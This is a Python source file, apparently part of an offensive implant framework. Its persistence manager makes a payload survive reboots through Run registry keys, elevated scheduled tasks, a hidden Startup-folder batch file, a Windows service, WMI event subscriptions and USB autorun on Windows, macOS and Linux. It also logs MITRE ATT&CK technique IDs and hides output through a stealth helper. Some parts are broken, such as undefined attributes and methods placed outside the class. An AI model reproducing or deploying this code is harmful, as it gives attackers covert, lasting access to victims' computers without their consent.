# Persistence Module
# Implements various persistence mechanisms for maintaining access

import os
import subprocess
import sys
if sys.platform == "win32":
    import winreg
from config import (
    PERSISTENCE_KEY_NAME, SCHEDULED_TASK_NAME, DEBUG_MODE,
    PAYLOAD_SCRIPT, MITRE_TECHNIQUES, AUTO_EXECUTION_ENABLED,
    USB_AUTO_RUN_ENABLED, USB_PAYLOAD_NAME
)
from core.stealth import stealth_manager

class PersistenceManager:
    
    def __init__(self):
        self.current_path = sys.executable
        self.script_path = os.path.abspath(PAYLOAD_SCRIPT)
        self.is_windows = sys.platform == "win32"
        self.installed_methods = []
    
    def install_all_persistence(self):
        success_count = 0
        
        # T1547.001
        if self.install_registry_persistence():
            success_count += 1
            self._log_technique('T1547.001', True, {
                'method': 'registry_run_key',
                'key_name': PERSISTENCE_KEY_NAME
            })
        
        # T1053.005
        if self.install_scheduled_task():
            success_count += 1
            self._log_technique('T1053.005', True, {
                'method': 'scheduled_task',
                'task_name': SCHEDULED_TASK_NAME
            })
        
        if self.install_startup_folder():
            success_count += 1
        
        if self.install_service_persistence():
            success_count += 1
        
        return success_count > 0
    
    def install_registry_persistence(self, key_name=None):
        if not self.is_windows:
            return False
            
        key_name = key_name or PERSISTENCE_KEY_NAME
        
        try:
            if self._install_hkcu_persistence(key_name):
                self.installed_methods.append('hkcu_run_key')
                return True
            
            if self._install_hklm_persistence(key_name):
                self.installed_methods.append('hklm_run_key')
                return True
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Registry persistence failed: {e}")
                )
        
        return False
    
    def _install_hkcu_persistence(self, key_name):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            command = f'"{self.current_path}" "{self.script_path}"'
            
            winreg.SetValueEx(
                key,
                key_name,
                0,
                winreg.REG_SZ,
                command
            )
            
            winreg.CloseKey(key)
            return True
            
        except Exception:
            return False
    
    def _install_hklm_persistence(self, key_name):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            command = f'"{self.current_path}" "{self.script_path}"'
            
            winreg.SetValueEx(
                key,
                key_name,
                0,
                winreg.REG_SZ,
                command
            )
            
            winreg.CloseKey(key)
            return True
            
        except Exception:
            return False
    
    def install_scheduled_task(self, task_name=None):
        if not self.is_windows:
            return False
            
        task_name = task_name or SCHEDULED_TASK_NAME
        
        try:
            cmd = [
                "schtasks", "/create",
                "/tn", task_name,
                "/tr", f'"{self.current_path}" "{self.script_path}"',
                "/sc", "onlogon",
                "/rl", "highest",
                "/f"  # Force overwrite if exists
            ]
            
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW if self.is_windows else 0
            )
            
            if result.returncode == 0:
                self.installed_methods.append('scheduled_task')
                return True
            
            return self._try_alternative_task_scheduling(task_name)
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Scheduled task persistence failed: {e}")
                )
            return False
    
    def _try_alternative_task_scheduling(self, task_name):
        alternatives = [
            ["schtasks", "/create", "/tn", task_name, 
             "/tr", f'"{self.current_path}" "{self.script_path}"',
             "/sc", "daily", "/st", "00:01", "/f"],
            
            # On system startup
            ["schtasks", "/create", "/tn", task_name,
             "/tr", f'"{self.current_path}" "{self.script_path}"',
             "/sc", "onstart", "/f"],
            
            # On idle
            ["schtasks", "/create", "/tn", task_name,
             "/tr", f'"{self.current_path}" "{self.script_path}"',
             "/sc", "onidle", "/i", "10", "/f"]
        ]
        
        for cmd in alternatives:
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if self.is_windows else 0
                )
                
                if result.returncode == 0:
                    self.installed_methods.append('scheduled_task_alt')
                    return True
                    
            except Exception:
                continue
        
        return False
    
    def install_startup_folder(self):
        if not self.is_windows:
            return False
            
        try:
            import shutil
            
            # Get startup folder path
            startup_folder = os.path.expanduser(
                r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            )
            
            if not os.path.exists(startup_folder):
                return False
            
            batch_name = f"{PERSISTENCE_KEY_NAME}.bat"
            batch_path = os.path.join(startup_folder, batch_name)
            
            batch_content = f'''@echo off
cd /d "{os.path.dirname(self.script_path)}"
"{self.current_path}" "{self.script_path}"
'''
            
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            subprocess.run([
                'attrib', '+h', batch_path
            ], capture_output=True)
            
            self.installed_methods.append('startup_folder')
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Startup folder persistence failed: {e}")
                )
            return False
    
    def install_service_persistence(self):
        if not self.is_windows:
            return False
            
        try:
            if not self._is_admin():
                return False
            
            service_name = PERSISTENCE_KEY_NAME.replace(" ", "")
            
            cmd = [
                "sc", "create", service_name,
                "binPath=", f'"{self.current_path}" "{self.script_path}"',
                "start=", "auto",
                "DisplayName=", PERSISTENCE_KEY_NAME
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode == 0:
                # Start the service
                subprocess.run([
                    "sc", "start", service_name
                ], capture_output=True)
                
                self.installed_methods.append('windows_service')
                return True
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Service persistence failed: {e}")
                )
        
        return False
    
    def _is_admin(self):
        """Check if running with administrator privileges"""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
    
    def install_wmi_persistence(self):
        if not self.is_windows:
            return False
        
        try:
            import wmi
            import pythoncom
            
            pythoncom.CoInitialize()
            
            # Connect to WMI
            c = wmi.WMI()
            
            # Create event consumer for user login
            consumer_name = f"UserLoginConsumer_{PERSISTENCE_KEY_NAME}"
            
            # Create command-line event consumer
            consumer = c.Win32_CommandLineEventConsumer(
                Name=consumer_name,
                CommandLineTemplate=f'cmd.exe /c "{self.payload_path}"',
                ProcessId=0
            )
            
            # Create event filter for user login
            filter_name = f"UserLoginFilter_{PERSISTENCE_KEY_NAME}"
            
            filter_query = (
                "SELECT * FROM __InstanceCreationEvent "
                "WITHIN 5 "
                "WHERE TargetInstance ISA 'Win32_LogonSession' "
                "AND TargetInstance.LogonType = 2"  # Interactive logon
            )
            
            event_filter = c.WMI_EventFilter(
                Name=filter_name,
                EventNamespace='root\\subscription',
                QueryLanguage='WQL',
                Query=filter_query
            )
            
            binding_name = f"Binding_{PERSISTENCE_KEY_NAME}"
            
            binding = c.WMI_FilterToConsumerBinding(
                Name=binding_name,
                Filter=event_filter.Associators_()[0],
                Consumer=consumer.Associators_()[0]
            )
            
            self.installed_methods.append('wmi_event_subscription')
            self.persistence_config['wmi_event'] = {
                'consumer': consumer_name,
                'filter': filter_name,
                'binding': binding_name
            }
            
            if DEBUG_MODE:
                print(f"WMI event subscription created: {consumer_name}")
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                print(f"WMI persistence installation failed: {e}")
            return False
    
    def remove_persistence(self):
        removed_count = 0
        
        for method in self.installed_methods:
            if method == 'hkcu_run_key':
                if self._remove_registry_persistence(winreg.HKEY_CURRENT_USER):
                    removed_count += 1
            elif method == 'hklm_run_key':
                if self._remove_registry_persistence(winreg.HKEY_LOCAL_MACHINE):
                    removed_count += 1
            elif method.startswith('scheduled_task'):
                if self._remove_scheduled_task():
                    removed_count += 1
            elif method == 'startup_folder':
                if self._remove_startup_folder():
                    removed_count += 1
            elif method == 'windows_service':
                if self._remove_service():
                    removed_count += 1
            elif method == 'wmi_event_subscription':
                if self._remove_wmi_persistence():
                    removed_count += 1
        
        return removed_count
    
    def _remove_wmi_persistence(self):
        try:
            import wmi
            import pythoncom
            
            pythoncom.CoInitialize()
            c = wmi.WMI()
            
            wmi_config = self.persistence_config.get('wmi_event', {})
            
            # Delete binding
            binding_name = wmi_config.get('binding')
            if binding_name:
                for binding in c.WMI_FilterToConsumerBinding(Name=binding_name):
                    binding.Delete_()
            
            # Delete consumer
            consumer_name = wmi_config.get('consumer')
            if consumer_name:
                for consumer in c.Win32_CommandLineEventConsumer(Name=consumer_name):
                    consumer.Delete_()
            
            # Delete filter
            filter_name = wmi_config.get('filter')
            if filter_name:
                for filter in c.WMI_EventFilter(Name=filter_name):
                    filter.Delete_()
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                print(f"WMI persistence removal failed: {e}")
            return False
    
    def _remove_registry_persistence(self, hive):
        try:
            if hive == winreg.HKEY_CURRENT_USER:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            else:
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            
            key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, PERSISTENCE_KEY_NAME)
            winreg.CloseKey(key)
            return True
            
        except Exception:
            return False
    
    def _remove_scheduled_task(self):
        try:
            result = subprocess.run([
                "schtasks", "/delete", "/tn", SCHEDULED_TASK_NAME, "/f"
            ], capture_output=True)
            
            return result.returncode == 0
            
        except Exception:
            return False
    
    def _remove_startup_folder(self):
        try:
            startup_folder = os.path.expanduser(
                r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            )
            batch_path = os.path.join(startup_folder, f"{PERSISTENCE_KEY_NAME}.bat")
            
            if os.path.exists(batch_path):
                os.remove(batch_path)
                return True
                
        except Exception:
            pass
        
        return False
    
    def _remove_service(self):
        try:
            service_name = PERSISTENCE_KEY_NAME.replace(" ", "")
            
            # Stop service
            subprocess.run([
                "sc", "stop", service_name
            ], capture_output=True)
            
            # Delete service
            result = subprocess.run([
                "sc", "delete", service_name
            ], capture_output=True)
            
            return result.returncode == 0
            
        except Exception:
            return False
    
    def _log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            stealth_manager.safe_execute(
                lambda: print(f"Technique {technique_id} ({technique_name}): {'Success' if success else 'Failed'}")
            )

persistence_manager = PersistenceManager()  
    
def install_usb_auto_execution(self, usb_drive_path=None):
       
        if not AUTO_EXECUTION_ENABLED or not USB_AUTO_RUN_ENABLED:
            return {'success': False, 'error': 'Auto-execution disabled'}
        
        result = {
            'success': False,
            'platform': sys.platform,
            'methods': [],
            'error': None
        }
        
        try:
            if self.is_windows:
                # Windows autorun.inf
                win_result = self._install_windows_autorun(usb_drive_path)
                if win_result['success']:
                    result['methods'].append('windows_autorun')
                result['success'] = len(result['methods']) > 0
                
            elif sys.platform == "darwin":
                # macOS launch agent
                macos_result = self._install_macos_launch_agent()
                if macos_result['success']:
                    result['methods'].append('macos_launch_agent')
                result['success'] = len(result['methods']) > 0
                
            elif sys.platform == "linux":
                # Linux udev rule + autostart
                linux_result = self._install_linux_autorun()
                if linux_result['success']:
                    result['methods'].append('linux_udev')
                    if linux_result.get('autostart'):
                        result['methods'].append('linux_autostart')
                result['success'] = len(result['methods']) > 0
            
            # Log technique
            self._log_technique('T1091', result['success'], {
                'methods': result['methods']
            })
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"USB auto-execution installation failed: {e}")
            return result
    
def _install_windows_autorun(self, usb_drive_path=None):
        try:
            from core.autorun import windows_autorun_manager
            
            if usb_drive_path:
                result = windows_autorun_manager.create_usb_autorun_package(
                    usb_drive_path,
                    self.current_path,
                    USB_PAYLOAD_NAME
                )
                return result
            else:
                return {'success': True, 'method': 'registry_persistence'}
                
        except Exception as e:
            if DEBUG_MODE:
                print(f"Windows autorun installation failed: {e}")
            return {'success': False, 'error': str(e)}
    
def _install_macos_launch_agent(self):
        try:
            from core.macos_autorun import macos_launch_agent_manager
            
            result = macos_launch_agent_manager.install_agent_with_autostart(
                self.current_path
            )
            return result
            
        except Exception as e:
            if DEBUG_MODE:
                print(f"macOS launch agent installation failed: {e}")
            return {'success': False, 'error': str(e)}
    
def _install_linux_autorun(self):
        try:
            from core.linux_autorun import linux_usb_auto_execution
            
            result = linux_usb_auto_execution.install_system_components(
                self.current_path,
                require_root=True
            )
            return result
            
        except Exception as e:
            if DEBUG_MODE:
                print(f"Linux autorun installation failed: {e}")
            return {'success': False, 'error': str(e)}
    
def create_usb_package(self, payload_path, output_dir, platform=None):
        try:
            from core.usb_packager import usb_packager
            
            result = usb_packager.package_payload_for_usb(
                payload_path,
                output_dir,
                platform=platform
            )
            
            self._log_technique('T1091', result['success'], {
                'package_path': result.get('package_path'),
                'platform': platform
            })
            
            return result
            
        except Exception as e:
            if DEBUG_MODE:
                print(f"USB package creation failed: {e}")
            return {'success': False, 'error': str(e)}
